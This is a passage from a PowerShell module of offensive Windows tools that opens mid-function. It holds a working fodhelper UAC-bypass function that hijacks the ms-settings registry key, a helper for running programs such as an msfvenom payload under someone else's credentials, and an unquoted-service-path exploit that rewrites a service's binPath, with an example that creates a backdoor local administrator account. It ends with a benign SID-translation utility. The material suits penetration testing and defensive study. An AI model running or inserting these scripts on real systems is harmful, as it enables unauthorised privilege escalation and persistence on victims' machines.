        If (($Value.ConsentPromptBehaviorAdmin -eq 1) -or ($Value.ConsentPromptBehaviorAdmin -eq 2))
        {

            Write-Host "This device is not vulnerable to the fodhelper UAC bypass method. `nUAC Settings: $Message" -ForegroundColor "Green"

            Pause

            Exit

        }  # End If
        Else
        {

            Write-Output "This device is vulnerable to the fodhelper bypass method. `nCurrent UAC Settings: $Message"

            Write-Output "To defend against the fodhelper UAC bypass there are 2 precautions to take.`n1.) Do not sign in with a user who is a member of the local administraors group. `n2.) Change HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System's values ConsentPromptBehaviorAdmin to a value of 1 or 2."

        }  # End Else

        Write-Verbose "Adding registry values..."

        New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\Command" -Force

        New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\Command" -Name "DelegateExecute" -Value "" -Force

        Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\Command" -Name "(default)" -Value $Program -Force

    }  # End BEGIN
    PROCESS
    {

        Write-Verbose "Executing fodhelper.exe and $Program..."

        Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

    }  # End PROCESS
    END
    {

        Write-Verbose "Removing registry values as they should be no longer needed..."

        Start-Sleep -Seconds 3

        Remove-Item -Path "HKCU:\Software\Classes\ms-settings\" -Recurse -Force

    }  # End END

}  # End Function Invoke-FodHelperBypass


<#
.NAME
    Invoke-UseCreds


.SYNOPSIS
    This cmdlet is for easily using credentials to execute a program. PowerShell can be a lot of typing.
    Especially when you dont' have a shell that allows autocompletion. This is a huge time saver.
    This function DOES NOT accept command line arguments. It only executes an application.


.SYNTAX
    Invoke-UseCreds [-Username] <string> [-Passwd] <string> [-Path] <string> [<CommonParameters>]


.PARAMETERS
    -Username
        Enter a string containing the domain or workgroup of the user and the username or in some cases just the username.
        Required?                    True
        Position?                    0
        Default value                None
        Accept pipeline input?       false
        Accept wildcard characters?  false

    -Passwd
        Enter the string value of the users password
        Required?                    True
        Position?                    1
        Default value                None
        Accept pipeline input?       false
        Accept wildcard characters?  false

    -Path
        Defines the location of the application that should execute as the user.
        Enter a string consisting of the absolute or relative path to the executable
        Required?                    True
        Position?                    2
        Default value                None
        Accept pipeline input?       false
        Accept wildcard characters?  false

    <CommonParameters>
        This cmdlet supports the common parameters: Verbose, Debug,
        ErrorAction, ErrorVariable, WarningAction, WarningVariable,
        OutBuffer, PipelineVariable, and OutVariable. For more information, see
        about_CommonParameters (https:/go.microsoft.com/fwlink/?LinkID=113216).


.DESCRIPTION
    This function is used to execute an application as another user. This DOES NOT accept command line arugments.
    This only executes an application.


.EXAMPLE
    -------------------------- EXAMPLE 1 --------------------------
   C:\PS> Invoke-UseCreds -Username 'OsbornePro\tobor' -Passwd 'P@ssw0rd1!' -Path 'C:\Windows\System32\spool\drivers\color\msf.exe'
   This command executes a msfvenom payload as the user tobor


.NOTES
    Author: Robert H. Osborne
    Alias: tobor
    Contact: rosborne@osbornepro.com
    https://roberthosborne.com


.INPUTS
    [System.String]


.OUTPUTS
    None

#>
Function Invoke-UseCreds {
    [CmdletBinding()]
        param(
            [Parameter(
                Mandatory=$True,
                Position=0,
                ValueFromPipeline=$False,
                HelpMessage="Enter the username: ")]
            [string]$Username,
            [Parameter(
                Mandatory=$True,
                Position=1,
                ValueFromPipeline=$False,
                HelpMessage="Enter the password: ")]
            [string]$Passwd,
            [Parameter(
                Mandatory=$True,
                Position=2,
                ValueFromPipeline=$False,
                HelpMessage="Define the path to the executable you want run as this user: ")]
            [string]$Path)  # End param

BEGIN
{

    Write-Verbose "[*] Building authenticated credential..."

    $Passw = ConvertTo-SecureString $Passwd -AsPlainText -Force

    $Cred = New-Object -TypeName System.Management.Automation.PSCredential($Username, $Passw)

}  # End BEGIN
PROCESS
{

    Write-Verbose "Executing $Path"

    If (!(Test-Path -Path $Path))
    {

        Try
        {

            Start-Process $Path -Credential $Cred

        }  # End Try
        Catch [System.Security.Authentication.AuthenticationException]
        {

            Write-Output "[x] The credentials you entered were incorrect"

        }  # End Catch
        Catch
        {

            $Error[0]

        }  # End Catch

    }  # End If
    Else
    {

        Throw "$Path could not be found at that location"

    }  # End Else

}  # End PROCESS
END
{

    Write-Output "[*] Program has been executed"

}  # End END

}  # End Function Invoke-UseCreds

<#
.NAME
    Invoke-UnquotedServicePathExploit


.SYNOPSIS
    Abuses an unquoted service path in the Windows registry to execute commands using the
    permissions of the user that starts the service.


.DESCRIPTION
    Uses the Name property of a service. The service is modified to contain a command in the
    binPath value. The service is then started to execute the defined command.


.PARAMETER
    -Name <String[]>
        Specifies the service names of services to be exploited. Service Name value is
        accepted from the pipeline.

        Required?                    true
        Position?                    1
        Default value                None
        Accept pipeline input?       True (ByPropertyName, ByValue)
        Accept wildcard characters?  false

    -Command <String[>
        Custom command to execute instead of user creation.

        Required?                    true
        Position?                    1
        Default value                None
        Accept pipeline input?       false
        Accept wildcard characters?  false


.EXAMPLE
    -------------------------- EXAMPLE 1 --------------------------
    PS C:\> Invoke-UnquotedServicePathExploit -Name wuauserv -Command "net user tobor Passw0rd1! /add", "net localgroup Administrators tobor /add"
    This example exploits 'wuauserv' to add a localuser "tobor" with password Passw0rd1! to the local administrator group


.NOTES
    Author: Robert H. Osborne
    Alias: tobor
    Contact: rosborne@osbornepro.com

.LINK
    https://github.com/tobor88
    https://www.powershellgallery.com/profiles/tobor
    https://roberthosborne.com


.INPUTS
    System.ServiceProcess.ServiceController, System.String
        You can pipe a service object or a service name to this cmdlet.


.OUTPUTS
    PSObject
        Returns a custom PSObject consisting of the parameter values entered

#>
Function Invoke-UnquotedServicePathExploit {
    [CmdletBinding()]
        param (
            [Parameter(
                Mandatory=$True,
                Position=0,
                ValueFromPipeline=$True,
                ValueFromPipelineByPropertyName=$True,
                HelpMessage="Define the name of the possibly vulnerable service.")]  # End Parameter
            [ValidateNotNullOrEmpty()]
            [Alias('ServiceName')]
            [String[]]$Name,

            [Parameter(
                Mandatory=$True,
                Position=1,
                ValueFromPipeline=$False,
                HelpMessage="Enter a command or commands you want executed")]  # End Parameter
            [ValidateNotNullOrEmpty()]
            [String[]]$Command)  # End param

BEGIN
{

    If ($PSBoundParameters['Command'])
    {

        $Commands = @($Command)

    }  # End If

}  # End BEGIN
PROCESS
{

    ForEach ($ServiceName in $Name)
    {

        Write-Verbose "[*] Obtaining object info for $ServiceName"
        $ServiceObj = Get-Service -Name $ServiceName

        Try
        {

            $ServiceDetails = Get-CimInstance -Class "Win32_Service" -Filter "Name='$ServiceName'"

        }  # End Try
        Catch
        {

            Write-Verbose "[!] Get-CimInstance is not available on device. Using Get-WmiObject"
            $ServiceDetails = Get-WmiObject -Class "Win32_Service" -Filter "Name='$ServiceName'"

        }  # End Catch

        $OriginalServicePath = $ServiceDetails.PathName
        Write-Verbose "[*] Original Service Path Value     : '$OriginalServicePath'"

        $OriginalServiceState = $ServiceDetails.State
        Write-Verbose "[*] Original State for $ServiceName : '$OriginalServiceState'"

        If ($ServiceDetails.StartMode -eq 'Disabled')
        {

            Write-Verbose "[*] $ServiceName is disabled. Changing service startup type to Manual"
            $ServiceObj | Set-Service -StartupType "Manual" -ErrorAction Stop

        }  # End If

        ForEach($ServiceCommand in $Commands)
        {

            Write-Verbose "[*] Modifying service binPath value to: $ServiceCommand"
            cmd /c sc config $ServiceName binPath="$ServiceCommand"

            Write-Verbose "[*] Starting $ServiceName to execute '$ServiceCommand'"
            Start-Service -Name $ServiceName -ErrorAction SilentlyContinue

            Write-Verbose "[*] Running 2 second buffer between commands"
            Start-Sleep -Seconds 2

        }  # End ForEach

        Write-Verbose "[*] Stopping modified service"
        Stop-Service -Name $ServiceName -Force -ErrorAction Stop

        Write-Verbose "[*] Restoring original path value for $ServiceName"
        Start-Sleep -Seconds 1

        cmd /c sc config $ServiceName binPath="$OriginalServicePath"
        $ServiceObj | Set-Service -StartupType "$OriginalServiceState" -ErrorAction SilentlyContinue
        # This is used to silently continue because the original value may not be an option for -StartupType

        $Obj = New-Object -TypeName "PSObject" -Property @{
            ServiceAbused = $ServiceObj.Name
            Command = ($Commands -join ' && ')
        }  # End Property
        $Obj

    }  # End ForEach

}  # End PROCESS

}  # End Function Invoke-UnquotedServicePathExploit


<#
.NAME
    Convert-SID


.SYNOPSIS
    This cmdlet is for translating an SID to a username or a username to an SID.


.SYNTAX
    Convert-SID [-Username] <string[]> [<CommonParameters>]

    Convert-SID [-SID] <string[]> [<CommonParameters>]


.PARAMETER Username
    If the username parameter value is specified it this cmdlet will result in the SID value of the user.

.PARAMETER SID
    If the SID parameter value is specified this cmdlet will result in the username value associated with the SID.


.EXAMPLE
    -------------------------- EXAMPLE 1 --------------------------
    C:\PS> $Pipe = New-Object PSObject -Property @{SID='S-1-5-21-2860287465-2011404039-792856344-500'}
    C:\PS> $Pipe | Convert-SID

    -------------------------- EXAMPLE 2 --------------------------
    C:\PS> Convert-SID -Username 'j.smith'
    C:\PS> Convert-SID -Username j.smith@domain.com

    -------------------------- EXAMPLE 3 --------------------------
    C:\PS> Convert-SID -SID S-1-5-21-2860287465-2011404039-792856344-500
    C:\PS> Convert-SID -SID 'S-1-5-21-2860287465-2011404039-792856344-500'


.NOTES
    Author: Robert H. Osborne
    Alias: tobor
    Contact: rosborne@osbornepro.com


.LINK
    https://github.com/tobor88
    https://www.powershellgallery.com/profiles/tobor
    https://roberthosborne.com


.INPUTS
    System.Array of Usernames or SIDs can be piped to this cmdlet based on property value name.


.OUTPUTS
    System.Management.Automation.PSCustomObject

#>
Function Convert-SID {
    [CmdletBinding(DefaultParameterSetName = 'Username')]
        param(
            [Parameter(
                ParameterSetName='Username',
                Position=0,
                Mandatory=$True,
                ValueFromPipeLine=$True,
                ValueFromPipeLineByPropertyName=$True)]  # End Parameter
            [ValidateNotNullOrEmpty()]
            [Alias('User','SamAccountName')]
            [String[]]$Username,

            [Parameter(
                ParameterSetName='SID',
                Position=0,
                Mandatory=$True,
                ValueFromPipeLine=$True,
                ValueFromPipeLineByPropertyName=$True)]  # End Parameter
            [ValidateNotNullOrEmpty()]
            [ValidatePattern('S-\d-(?:\d+-){1,14}\d+')]
            [String[]]$SID)  # End param


BEGIN
{

    [array]$Obj = @()

    Write-Verbose "[*] Obtaining username and SID information for defined value"

}  # End BEGIN
PROCESS
{

    For ($i = 0; $i -lt (Get-Variable -Name ($PSCmdlet.ParameterSetName) -ValueOnly).Count; $i++)
    {

        $Values = Get-Variable -Name ($PSCmdlet.ParameterSetName) -ValueOnly

        New-Variable -Name ArrayItem -Value ($Values[$i])

        Switch ($PSCmdlet.ParameterSetName)
        {
            SID {$ObjSID = New-Object -TypeName System.Security.Principal.SecurityIdentifier($ArrayItem); $ObjUser = $ObjSID.Translate([System.Security.Principal.NTAccount])}
            Username {$ObjUser = New-Object -TypeName System.Security.Principal.NTAccount($ArrayItem); $ObjSID = $ObjUser.Translate([System.Security.Principal.SecurityIdentifier])}
        }  # End Switch

        $Obj += New-Object -TypeName "PSObject" -Property @{
            Username = $ObjUser.Value
            SID = $ObjSID.Value
        }   # End Property

        Remove-Variable -Name ArrayItem

    }  # End For

}  # End PROCESS
END
{

    Write-Output $Obj

}  # End END

}  # End Function Convert-SID
